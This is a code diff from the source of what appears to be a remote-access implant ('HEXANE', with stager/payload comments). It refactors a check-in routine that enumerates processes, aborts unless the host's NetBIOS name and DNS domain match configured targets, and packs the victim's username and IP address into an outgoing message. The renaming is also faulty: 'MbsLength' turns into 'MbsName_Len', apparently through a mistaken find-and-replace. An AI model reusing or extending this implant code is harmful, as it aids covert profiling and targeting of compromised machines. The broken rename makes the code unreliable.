@@ -7,7 +7,6 @@ using namespace Stream;
 using namespace Dispatcher;
 using namespace Memory::Context;
 
-#define STAGER
 // TODO: delegate functions and api separately to stager/payload
 namespace Main {
     UINT8 RDATA Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
@@ -52,22 +51,16 @@ namespace Main {
 	    HEXANE;
 
 	    _stream *out = CreateStreamWithHeaders(TypeCheckin);
+
 	    IP_ADAPTER_INFO adapter		= { };
 	    OSVERSIONINFOW os_version	= { };
-
 	    BOOL success = true;
-	    DWORD length = MAX_PATH;
-	    CHAR buffer[MAX_PATH] = { };
 
-	    PROCESSENTRY32 pe32 = { };
-	    pe32.dwSize = sizeof(PROCESSENTRY32);
+	    PROCESSENTRY32 proc_entry = { };
+	    proc_entry.dwSize = sizeof(PROCESSENTRY32);
 
-    	SERVICE_STATUS serviceStatus = { };
-    	SC_HANDLE scmHandle		= { };
-    	SC_HANDLE serviceHandle = { };
-
-	    HANDLE hProcessSnap = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	    if (hProcessSnap == INVALID_HANDLE_VALUE) {
+	    HANDLE snap = ctx->enumapi.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	    if (snap == INVALID_HANDLE_VALUE) {
 	    	// log error
 		    return false;
 	    }
@@ -99,9 +92,12 @@ namespace Main {
 		    }
 	    }
 
-	    if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
+	    DWORD name_len = MAX_PATH;
+	    CHAR buffer[MAX_PATH] = { };
+
+	    if (ctx->enumapi.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
 		    if (ctx->config.hostname[0]) {
-			    if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
+			    if (MbsBoundCompare(buffer, ctx->config.hostname, MbsName_Len(ctx->config.hostname)) != 0) {
 				    return false;
 			    }
 		    }
@@ -111,11 +107,11 @@ namespace Main {
 	    }
 
 	    MemSet(buffer, 0, MAX_PATH);
-	    length = MAX_PATH;
+	    name_len = MAX_PATH;
 
-	    if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
+	    if (ctx->enumapi.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
 		    if (ctx->network.domain[0]) {
-			    if (MbsBoundCompare(ctx->network.domain, buffer, MbsLength(ctx->network.domain)) != 0) {
+			    if (MbsBoundCompare(ctx->network.domain, buffer, MbsName_Len(ctx->network.domain)) != 0) {
 				    return false;
 			    }
 		    }
@@ -125,17 +121,17 @@ namespace Main {
 	    }
 
 	    MemSet(buffer, 0, MAX_PATH);
-	    length = MAX_PATH;
+	    name_len = MAX_PATH;
 
-	    if (ctx->enumapi.GetUserNameA((LPSTR) buffer, &length)) {
+	    if (ctx->enumapi.GetUserNameA((LPSTR) buffer, &name_len)) {
 		    PackString(out, buffer);
 	    } else {
 		    PackUint32(out, 0);
 	    }
 
 	    MemSet(buffer, 0, MAX_PATH);
-	    length = sizeof(IP_ADAPTER_INFO);
-	    if (ctx->enumapi.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
+	    name_len = sizeof(IP_ADAPTER_INFO);
+	    if (ctx->enumapi.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
 		    PackString(out, adapter.IpAddressList.IpAddress.String);
 	    } else {
 		    PackUint32(out, 0);
